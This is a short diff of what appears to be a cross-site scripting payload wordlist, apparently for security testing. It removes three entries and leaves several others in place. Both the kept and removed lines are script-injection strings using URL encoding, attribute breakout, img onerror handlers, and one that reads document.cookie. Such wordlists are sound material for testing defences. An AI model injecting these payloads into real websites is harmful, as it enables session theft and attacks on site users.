@@ -32,6 +32,3 @@ admin'%3balert(String%2efromCharCode(88,83,83))%2f%2f%5c'%3balert(String%2efromC
 admintest%22%3e%3cscript%3ealert(1)%3c%2fscript%3etest
 Test1<script>alert(1)</script>Test1
 Test\" onmouseover=\"alert(1)\" style=display:block>
-%3Cscript%3Ealert(document.domain)%3C%2fscript%3E
-<p><img src=\'x\' onerror=alert(1)></p>
-“&gt;&lt;img src=x onerror=alert(document.cookie)&gt;
